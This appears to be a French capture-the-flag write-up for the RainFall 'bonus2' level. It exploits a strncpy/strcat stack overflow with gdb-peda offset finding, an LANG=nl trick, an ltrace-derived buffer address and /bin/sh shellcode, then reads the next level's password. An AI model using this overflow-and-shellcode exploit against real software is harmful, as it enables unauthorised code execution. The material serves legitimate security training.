# B2onus

- Quand on met un arg 1 de 40+ strncpy met un `\0` trop loin se qu'il fait qu'il est ecraser par arg2. Se qui fait que arg1 et arg2 sont une string
- On voit donc dans cette exemple qu'on peut overwrite la Return Adress
<pre>
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA'
gdb-peda$ r $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA'

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

Program received signal SIGSEGV, Segmentation fault.
[-------------------------------------code-------------------------------------]
<strong>Invalid $PC address: 0x800413b</strong>
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0800413b in ?? ()
gdb-peda$ pattern offset 'A;'
<strong>A; found at offset: 29</strong>
</pre>

- Quand LANG est different en different de NULL alors var_60 est ecrit dans env
- Sauf que vu qu'il y a deja un overide dans le strcpy de l'arg[1]. Les arg_1 et arg_2 sont considerer comme un seul argument

<pre>
$> LANG=nl gdb ./bonus2 
gdb-peda$ pattern create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
gdb-peda$ r $(python -c "print('A' * 40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'

Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

[----------------------------------registers-----------------------------------]
<strong>EIP: 0x41412841 ('A(AA')</strong>
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41412841
[------------------------------------stack-------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41412841 in ?? ()
gdb-peda$ pattern offset 'A(AA'
<strong>A(AA found at offset: 23</strong>
</pre>
- On recupere la bonne addresse memoire ou sera stocké le shellcode
<pre>
bonus2@RainFall:~$ LANG=nl ltrace ./bonus2 $(/tmp/shell) "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
\__libc_start_main(0x8048529, 3, 0xbffff684, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(<strong>0xbffff580</strong>, "1\311\367\341Qh//shh/bin\211\343\260\013\315\200AAAAAAAAAAA"..., 40) = 0xbffff580
strncpy(0xbffff5a8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 32)                            = 0xbffff5a8
getenv("LANG")                                                                            = "nl"
memcmp(0xbffff84c, 0x804873d, 2, 0xb7fff918, 0)                                           = 1
memcmp(0xbffff84c, 0x8048740, 2, 0xb7fff918, 0)                                           = 0
strcat("Goedemiddag! ", "1\311\367\341Qh//shh/bin\211\343\260\013\315\200AAAAAAAAAAA"...) = "Goedemiddag! 1\311\367\341Qh//shh/bin\211\343\260\013"...
puts("Goedemiddag! 1\311\367\341Qh//shh/bin\211\343\260\013"...)                          = 86
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</pre>
- Et on peut lancer le programme avec les argument suivant

| arg 1 | arg 2 |
|-------|-------|
| shellcode + `A` * 20 | `B` * 23 + `\x80\xf5\xff\xbf` |

- On creer des .c car en python ca bug
```
bonus2@RainFall:~$ LANG=nl ./bonus2 $(/tmp/shell) $(/tmp/pat)
Goedemiddag! 1���Qh//shh/bin���̀
                               AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
